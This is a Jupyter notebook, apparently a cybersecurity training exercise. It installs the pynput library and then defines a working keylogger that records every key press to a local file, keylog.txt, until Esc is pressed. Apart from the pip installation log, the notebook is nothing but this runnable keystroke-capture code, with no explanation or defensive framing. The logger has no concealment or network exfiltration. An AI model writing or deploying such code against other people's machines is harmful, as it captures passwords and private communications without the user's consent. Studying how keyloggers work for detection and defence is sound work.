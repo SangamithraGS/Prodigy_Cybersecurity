{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynputNote: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "[notice] A new release of pip is available: 24.0 -> 24.2\n",
      "[notice] To update, run: python.exe -m pip install --upgrade pip\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
      "Requirement already satisfied: six in c:\\users\\adimin\\appdata\\roaming\\python\\python311\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 90.2/90.2 kB 512.8 kB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.7\n"
     ]
    }
   ],
   "source": [
    "pip install pynput\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "# The file where the keystrokes will be logged\n",
    "log_file = \"keylog.txt\"\n",
    "\n",
    "# Function to handle the logging of keys\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        # Handling special keys\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(f\" [{key}] \")\n",
    "\n",
    "def on_release(key):\n",
    "    # Stop listener by pressing the 'Esc' key\n",
    "    if key == keyboard.Key.esc:\n",
    "        return False\n",
    "\n",
    "# Setting up the listener for the keyboard events\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
